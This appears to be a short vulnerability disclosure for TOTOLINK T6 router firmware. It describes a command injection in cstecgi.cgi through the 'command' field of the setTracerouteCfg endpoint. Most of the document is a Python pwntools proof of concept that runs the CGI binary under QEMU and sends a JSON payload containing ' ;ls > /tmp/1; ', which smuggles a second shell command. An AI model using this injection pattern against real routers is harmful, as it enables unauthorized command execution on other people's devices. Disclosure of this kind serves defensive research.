# Command Injection

## TOTOLINK_T6

version: V4.1.5cu.709_B20210518

## Description:

There is a execute arbitrary command  in cstecgi.cgi

## Source:

you may download it from : http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=16&ids=36

## Analyse:



in sub_42102C, var get from command

![](https://s3.bmp.ovh/imgs/2022/08/23/a0254aea3f314f38.png)


finally pass to v5 and execute 


## POC

```
from pwn import *
import json

data = {
    "topicurl": "setting/setTracerouteCfg",
    "command": " ;ls > /tmp/1; "
}

data = json.dumps(data)
print(data)

argv = [
    "qemu-mipsel-static",
    "-g", "1234",
    "-L", "./root/",
    "-E", "CONTENT_LENGTH={}".format(len(data)),
    "-E", "REMOTE_ADDR=192.168.0.1",
    "./cstecgi.cgi"
]

a = process(argv=argv)
a.sendline(data.encode())

a.interactive()
```
